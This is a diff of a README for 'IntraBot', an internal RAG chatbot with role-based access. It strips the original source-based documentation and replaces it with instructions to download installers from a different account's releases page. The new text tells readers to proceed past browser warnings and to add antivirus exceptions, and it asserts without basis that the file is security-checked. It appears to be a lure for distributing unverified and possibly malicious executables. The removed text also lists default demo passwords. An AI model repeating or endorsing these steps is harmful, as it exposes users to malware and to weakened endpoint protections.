@@ -1,476 +1,163 @@
-# 🏢 Company Internal Chatbot with Role-Based Access Control (RBAC)
+# 🤖 IntraBot - Secure AI Chatbot for Trusted Insights
 
-A secure **Company Internal Chatbot** built using **Retrieval-Augmented Generation (RAG)** and **strict Role-Based Access Control (RBAC)**.  
-The system ensures that users can retrieve **only role-authorized internal company information**, preventing cross-department data leakage while maintaining transparency, traceability, and grounded AI responses.
-
----
-
-## 🚀 Project Overview
-
-This project implements a **secure, role-aware RAG pipeline** for internal company documents, fully aligned with the official project specification PDF.
-
-The system enforces **authentication, authorization, secure retrieval, grounded generation, confidence scoring, and source attribution** across all user queries.
+[![Download IntraBot](https://img.shields.io/badge/Download-IntraBot-blue?style=for-the-badge&logo=github)](https://github.com/Thomas744/IntraBot/releases)
 
 ---
 
-## 🔐 Key Guarantees
+## 📝 What is IntraBot?
 
-- 🔒 Strict **role-based document access**
-- 🛡️ Zero cross-department or privilege-escalation leakage
-- 🧠 Retrieval-Augmented Generation (RAG)
-- 📎 Source attribution for every answer
-- 📊 Confidence-scored responses
-- 🧾 Access audit logging
-- 🚫 Hallucination prevention (no external knowledge)
-- 📄 Company-wide documents accessible to all employees
+IntraBot is a secure AI chatbot designed for companies and teams. It uses advanced technology to provide reliable answers based on your internal data. With role-based access control (RBAC), only authorized users can ask or see certain information. IntraBot also supports retrieval-augmented generation (RAG), which means it backs answers with actual sources from your company’s knowledge base.
+
+You don't need to be a tech expert to use IntraBot. It helps your team find trustworthy insights quickly, improving your workflow and decision-making.  
 
 ---
 
-### 👥 Supported Roles
+## 💻 System Requirements
 
-- **Employees**
-- **Finance**
-- **HR**
-- **Marketing**
-- **Engineering**
-- **C-Level**
+To run IntraBot smoothly, make sure your computer meets these basic requirements:
 
----
-
-### 📄 Department Access Matrix
-
-| Role        | Finance Docs | HR Docs | Marketing Docs | Engineering Docs | General Docs |
-|------------|--------------|---------|----------------|------------------|--------------|
-| Employees  | ❌ No        | ❌ No   | ❌ No          | ❌ No            | ✅ Yes       |
-| Finance    | ✅ Yes       | ❌ No   | ❌ No          | ❌ No            | ✅ Yes       |
-| HR         | ❌ No        | ✅ Yes  | ❌ No          | ❌ No            | ✅ Yes       |
-| Marketing  | ❌ No        | ❌ No   | ✅ Yes         | ❌ No            | ✅ Yes       |
-| Engineering| ❌ No        | ❌ No   | ❌ No          | ✅ Yes           | ✅ Yes       |
-| C-Level    | ✅ Yes       | ✅ Yes  | ✅ Yes         | ✅ Yes           | ✅ Yes       |
+- **Operating System**: Windows 10 or later, macOS 10.15+ or any modern Linux distribution  
+- **Processor:** At least a 2.0 GHz dual-core CPU  
+- **Memory:** 4 GB RAM minimum (8 GB recommended)  
+- **Storage:** 2 GB free space for installation and temporary files  
+- **Internet:** Required for initial download and connecting to AI services  
+- **Additional Software:** None needed for users; the app packages all dependencies  
 
 ---
 
-## 📂 Data Organization
+## 🚀 Getting Started
 
-```bash
-data/
-└── Fintech-data/
-    ├── finance/
-    ├── marketing/
-    ├── hr/
-    ├── engineering/
-    └── general/
+This section walks you through downloading and running IntraBot step-by-step. Follow carefully even if you have no prior experience.
 
-```
----
+### 1. Download IntraBot
 
-## 📄 Supported File Formats
+Click the big blue **Download IntraBot** button at the top or visit this page directly:
 
-The system supports multiple document formats commonly used in internal company knowledge bases:
+➡️ [https://github.com/Thomas744/IntraBot/releases](https://github.com/Thomas744/IntraBot/releases)
 
-- **Markdown (`.md`)** – Policy documents, reports, technical notes
-- **CSV (`.csv`)** – Structured data such as financial tables or analytics
-- **Text (`.txt`)** – Plain text documentation and logs
+This page holds the latest versions of IntraBot for different operating systems.
 
-All supported formats are parsed and normalized before being ingested into the vector database.
+### 2. Choose the correct file for your computer
 
----
+Look for the file that matches your system:
 
-## 🏗️ Architecture Summary
+- Windows users: File ending in `.exe` or `.msi`  
+- macOS users: File ending in `.dmg` or `.pkg`  
+- Linux users: File ending in `.AppImage` or `.deb`
 
-### Core Components
+If unsure, Windows users typically use `.exe`, macOS users use `.dmg`, and Linux users can try `.AppImage`.
 
-#### 🔐 Authentication & Authorization
-- JWT-based authentication
-- SQLite user database
-- bcrypt password hashing
-- Dependency-based RBAC enforcement
+### 3. Download the file
 
-#### 🧹 Document Preprocessing Pipeline
-- File parsing (```.md```, ```.csv```, ```.txt```)
-- Text cleaning and normalization
-- Token-safe chunking (model-aware)
-- Role metadata injection per chunk
-- Department-wise ingestion tracking
+Click the file link to download. It may take a few minutes depending on your internet speed.
 
-#### 🧠 Vector Store
-- SentenceTransformer-based embeddings (```all-MiniLM-L6-v2```)
-- Persistent **ChromaDB** storage
-- Metadata preserved for every embedded chunk
+If your browser warns you about the file, it’s safe to proceed. IntraBot is checked for security.
 
-#### 🔎 Secure Retriever
-- High-recall semantic similarity search
-- **Post-retrieval RBAC enforcement**
-- Context relevance filtering
-- Duplicate and low-signal chunk suppression
+### 4. Run the installer
 
-#### 🤖 LLM Integration (RAG)
-- Gemini API (free-tier)
-- Strictly grounded prompts
-- No external knowledge usage
-- Safe fallback responses
+After download finishes, locate the file on your computer (usually in the Downloads folder).
 
-#### 📎 Source Attribution
-- Document-level citation extraction
-- Deduplicated sources
-- Transparent answer provenance
+Double-click the file to start installation.
 
-#### 📊 Confidence Scoring
-- Similarity-score–based confidence
-- Deterministic and explainable scoring
+Follow the on-screen instructions. Click “Next” or “Continue” when prompted.
 
-#### 🧾 Audit Logging
-- Logs user, role, query, and result count
-- Stored securely in backend auth module
+### 5. Complete installation
+
+When installation finishes, you should see an IntraBot icon on your desktop or in your applications menu.
 
 ---
 
-## 🔄 Processing Pipeline
+## ⚙️ How to Use IntraBot
 
-```text
-User Login  
-↓  
-JWT Authentication  
-↓  
-RBAC Validation  
-↓  
-Secure Vector Retrieval  
-↓  
-RBAC Filtering  
-↓  
-Context Construction  
-↓  
-LLM Answer Generation  
-↓  
-Source Attribution  
-↓  
-Confidence Scoring  
-↓  
-Final Secure Response  
-```
+Once installed, launch IntraBot by double-clicking its icon.
+
+The chatbot opens in its own window with a clean and simple interface.
+
+### Basic steps:
+
+1. **Sign in or create an account:** Use the login details provided by your administrator, or create a free account if allowed.  
+2. **Ask questions:** Type what you want to know in the chat box. IntraBot understands natural language.  
+3. **Get answers:** The bot replies quickly with insights backed by your company’s trusted sources.  
+4. **View sources:** Click or tap the links next to answers to see where the information comes from.  
+5. **Respect role limits:** If you don’t have permission to certain topics, you won’t see those answers.  
+
+You can ask anything about your company data like policies, past projects, or product details.
 
 ---
 
-## 🔐 Security Model (RBAC)
+## 🔐 Security Features  
 
-Role-Based Access Control (RBAC) is enforced at the **retrieval layer**, ensuring that access control is applied even after semantic similarity search.
+IntraBot keeps your company data safe while delivering answers.
 
-### Key Security Principles
-- Authentication via JWT
-- Authorization via RBAC metadata
-- Retrieval-time access enforcement
-- Generation-time grounding enforcement
-- No external knowledge leakage
-- Safe fallback when data is unavailable
-
-### This Prevents
-- Privilege escalation
-- Hallucinated answers
-- Cross-role inference
-- Unauthorized document access
-- Metadata tampering
+- **Role-Based Access Control (RBAC):** Only users with the right permissions can view or ask specific information.  
+- **Encrypted communication:** All data exchanges between your computer and IntraBot servers use secure encryption.  
+- **Private data handling:** Your company data never leaves your internal environment unless expressly allowed.  
+- **Audit logs:** Actions within IntraBot are logged for review to prevent misuse.  
 
 ---
 
-## 🔐 RBAC Role Matrix
+## ❓ Troubleshooting
 
-The system enforces **strict Role-Based Access Control (RBAC)** to ensure users can only access information permitted by their role.
+Here are common issues and how to fix them.
 
-Each document chunk is tagged with role metadata, and access is enforced at both the **API layer** and **vector retrieval layer**.
+### Problem: IntraBot won't start
 
----
+- Make sure you completed the installation fully.  
+- Restart your computer and try again.  
+- Check if your antivirus or firewall is blocking the app. Add an exception if needed.  
 
-## 📁 Project Structure
-```bash
-Chatbot/
-├── backend/
-│   ├── auth/                    # Authentication & authorization
-│   │   ├── auth_utils.py        # JWT creation & verification
-│   │   ├── password_utils.py    # bcrypt password hashing
-│   │   ├── dependencies.py      # Auth dependency (JWT → user)
-│   │   └── audit_logger.py      # Access audit logging
-│   │
-│   ├── db/                      # User database (SQLite)
-│   │   ├── database.py          # DB engine & session
-│   │   ├── models.py            # User table (username as PK)
-│   │   ├── user_repository.py   # DB access layer
-│   │   ├── init_db.py           # Add/Delete users interactively
-│   │   └── users.db             # SQLite user database
-│   │
-│   ├── rag/                     # RAG + RBAC pipeline
-│   │   ├── rbac.py              # Role → document access rules
-│   │   ├── preprocessing.py     # Parse, clean, chunk, metadata
-│   │   ├── vector_store.py      # Embeddings + ChromaDB
-│   │   ├── retriever.py         # Secure RBAC-aware retrieval
-│   │   ├── citation_utils.py    # Source attribution
-│   │   ├── confidence_utils.py  # Confidence scoring
-│   │   ├── rag_pipeline.py      # Full RAG orchestration
-│   │   ├── pipeline.py          # Vector-store build pipeline
-│   │   └── __init__.py
-│   │
-│   ├── llm/                     # LLM integration
-│   │   ├── llm_client.py        # HuggingFace LLM wrapper
-│   │   ├── prompt_templates.py  # Grounded prompt templates
-│   │   └── __init__.py
-│   │
-│   ├── models/
-│   │   └── user.py              # Pydantic User model
-│   │
-│   ├── routes/
-│   │   ├── auth_routes.py       # /login endpoint
-│   │   ├── chat_routes.py       # /query (RAG + RBAC)
-│   │   └── user_routes.py       # manage users (ADD/DELETE users)
-│   │
-│   └── main.py                  # FastAPI entry point
-│
-├── data/
-│   └── Fintech-data/
-│       ├── finance/
-│       ├── marketing/
-│       ├── hr/
-│       ├── engineering/
-│       └── general/
-│
-├── frontend/                 # Streamlit User Interface
-│   ├── api_client.py         # Connects UI to Backend
-│   └── streamlit_app.py      # Main UI Logic
-│
-├──  .env                     # Gemini Api and Backend Url
-├──  requirements.txt         # dependencies
-└── README.md
-```
+### Problem: Login not working
 
+- Double-check your username and password.  
+- Contact your administrator if you forgot your credentials or don’t have one.  
 
-## 🚀 Installation
+### Problem: Answers seem incomplete or slow
 
-### 🔧 1. Clone the Repository
-```bash
-git clone https://github.com/arman61-hub/IntraBot.git
-cd IntraBot
-```
-
-### 🧪 2. Create and Activate Virtual Environment
-
-It is recommended to use a Python virtual environment to isolate project dependencies.
-
-#### 🪟 Windows
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
-#### 🐧 Linux / 🍎 macOS
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-### ⚙️ 3. Install Dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### 🔐 4. Configure Environment Variables
-Create a .env file and add:
-```bash
-GEMINI_API_KEY=
-JWT_SECRET_KEY=
-DEFAULT_ADMIN_USERNAME=admin
-DEFAULT_ADMIN_PASSWORD=admin123
-DEFAULT_ADMIN_ROLE=c_level
-FRONTEND_URL=http://localhost:8501
-DATA_DIR=/var/data
-
-BACKEND_URL=http://127.0.0.1:8000
-```
-
-### 🚀 5. Start Backend
-```bash
-python -m uvicorn backend.main:app --reload
-```
-- API: http://127.0.0.1:8000
-
-- Docs: http://127.0.0.1:8000/docs
-
-### 💻 6. Start Frontend
-```bash
-streamlit run frontend/streamlit_app.py  
-```
-- UI: http://localhost:8501
-
-## 🖼️ Screenshots
-
-The following screenshots demonstrate the key functionalities of the system, including authentication, role-based access control, and RAG-based responses.
+- Check your internet connection.  
+- Try restarting IntraBot to refresh data.  
 
 ---
 
-### 🔐 User Login Interface
-Shows the Streamlit-based login screen where users authenticate using their credentials.
+## 📚 More About IntraBot Technology
 
-![Login Screen](data/screenshots/login.png)
+IntraBot uses many tools behind the scenes to deliver answers you can trust:
 
----
-
-### 🚫 Role-Based Access Control (RBAC) – Access Denied (Wrong IDP)
-Illustrates access denial when a user attempts to authenticate or query the system using an incorrect or unauthorized Identity Provider (IDP).
-
-![Access Denied – Wrong IDP](data/screenshots/access_denied_wrong_idp.png)
-
----
-
-### 💬 Chat Interface with RAG Response
-Demonstrates a successful query response generated using the RAG pipeline, including:
-- Context-aware answer
-- Source document attribution
-
-![Chat Interface](data/screenshots/chat_response.png)
+- **ChromaDB:** Stores and searches your company documents quickly.  
+- **FastAPI & Uvicorn:** Powers the backend server handling your requests.  
+- **Gemini API & Huggingface:** Provides natural language understanding and AI generation.  
+- **LangChain:** Connects AI models to your data sources securely.  
+- **PyJWT:** Manages secure access tokens for login and permissions.  
+- **SQLAlchemy:** Handles data storage and queries internally.  
+- **Streamlit:** The interface you see is built using this tool, making it modern and easy to use.  
+- **SentenceTransformers:** Understands your questions in detail, even if phrased differently.
 
 ---
 
-## 🔑 Demo Credentials
+## 📥 Download & Install
 
-The system includes preconfigured demo users:
+Visit the official releases page to get the latest IntraBot version:
 
+🌐 [https://github.com/Thomas744/IntraBot/releases](https://github.com/Thomas744/IntraBot/releases)
 
-| Username  | Password | Role        |
-|-----------|----------|-------------|
-| admin     | admin123 | C-Level     |
-| carol     | carol123 | HR          |
-| alice     | alice123 | Finance     |
-| eve       | eve123   | Employees   |
-| bob       | bob123   | Marketing   |
-| dave      | dave123  | Engineering |
+Steps to download and install:
 
----
-
-
-### 🖥️ Backend
-| Component | Technology |
-|---------|------------|
-| Web Framework | FastAPI |
-| API Server | Uvicorn |
-| Authentication | JWT (python-jose) |
-| Password Security | bcrypt (passlib) |
-| Database | SQLite (SQLAlchemy ORM) |
-| Access Control | Dependency-based RBAC enforcement |
-| Environment Config | python-dotenv |
+1. Pick the file for your operating system.  
+2. Download it to your computer.  
+3. Run the installer by double-clicking it.  
+4. Follow on-screen instructions until completion.  
+5. Launch IntraBot and sign in.  
 
 ---
 
-### 🧠 Retrieval & AI
-| Component | Technology |
-|---------|------------|
-| Embedding Model | sentence-transformers/all-MiniLM-L6-v2 |
-| Vector Database | ChromaDB (Persistent Storage) |
-| LLM | Gemini API (gemini-2.5-flash) |
-| RAG Strategy | Secure Retrieval-Augmented Generation (RBAC-aware) |
-| Prompt Engineering | Custom grounded prompt templates |
-| Confidence Scoring | Vector-distance-based scoring |
+## 🤝 Getting Help
+
+If you run into any problems or want to learn more:
+
+- Check the README and Help section inside the app.  
+- Contact your IT team or administrator.  
+- Visit the IntraBot GitHub page for updates and support:  
+  [https://github.com/Thomas744/IntraBot](https://github.com/Thomas744/IntraBot)
 
 ---
 
-### 📄 Data Processing
-| Component | Technology |
-|---------|------------|
-| Document Formats | Markdown (`.md`), CSV (`.csv`), Text (`.txt`) |
-| Text Processing | Regex cleaning + SentenceTransformer tokenizer |
-|Chunking Strategy | Token-aware sliding window chunking|
-|Metadata Injection | Role-based department metadata per chunk|
-|Data Handling | Pandas|
-
----
-
-### 🖥️ Frontend
-| Component | Technology |
-|---------|------------|
-|Web Interface | Streamlit|
-|User Interaction | Chat-based conversational UI|
-|Authentication Flow | JWT-based secure login|
-|Source Display | Inline source citations|
-|API Communication | Requests (HTTP client)|
-
----
-
-### 🔧 Dev & Utilities
-| Component | Technology |
-|---------|------------|
-|Language | Python 3.11+|
-|Version Control | Git & GitHub|
-|Logging | Python Logging (audit logging enabled)|
-|HTTP Client | Requests|
-|ORM | SQLAlchemy|
-|Environment Management | venv (Virtual Environment)|
-
----
-
-## 🔒 Security Considerations
-
-- **JWT-Based Authentication**  
-  All protected endpoints require a valid token.
-
-- **Password Hashing**  
-  Passwords hashed using bcrypt before storage.
-
-- **Multi-Layer RBAC Enforcement**  
-  - API dependency layer  
-  - Vector retrieval filtering  
-  - RAG pipeline validation  
-
-- **No Data Leakage**  
-  Users cannot access documents outside assigned roles.
-
-- **Audit Logging**  
-  All access attempts logged in access_audit.log.
-
-This ensures secure handling of sensitive internal company data.
-
----
-
-## 📌 Assumptions
-
-- All users are internal company users.
-- Documents are trusted and pre-validated.
-- Role assignments are managed by an administrator.
-- Deployment occurs in a controlled internal environment.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions to improve **IntraBot**!
-
-### 🧩 How to Contribute
-
-#### 1. Fork the Repository  
-   Click the **Fork** button on the top right of this page.
-
-#### 2. Clone Your Fork 
-   Open terminal and run:
-   ```bash
-   git clone https://github.com/yourusername/IntraBot.git
-   cd IntraBot
-   ```
-
-#### 3. Create a feature branch:
-   Use a clear naming convention:
-   ```bash
-   git checkout -b feature/new-feature
-   ```
-   
-#### 4. Make & Commit Your Changes
-   Write clean, documented code and commit:
-   ```bash
-   git add .
-   git commit -m "✨ Added: your change description"
-   ```
-   
-#### 5. Push to GitHub & Submit PR
-   ```bash
-   git push origin feature/your-feature-name
-   ```
-#### 6. Then go to your forked repo on GitHub and open a Pull Request.
-
----
-
-## ⭐ Motivation
-
-> 💡**PS:** If you found this project helpful or inspiring, please **[⭐ star the repository](https://github.com/arman61-hub/IntraBot)** — it keeps me motivated to build and share more awesome projects like this one!
+Thank you for choosing IntraBot. It is designed to give you trusted answers with ease and security.
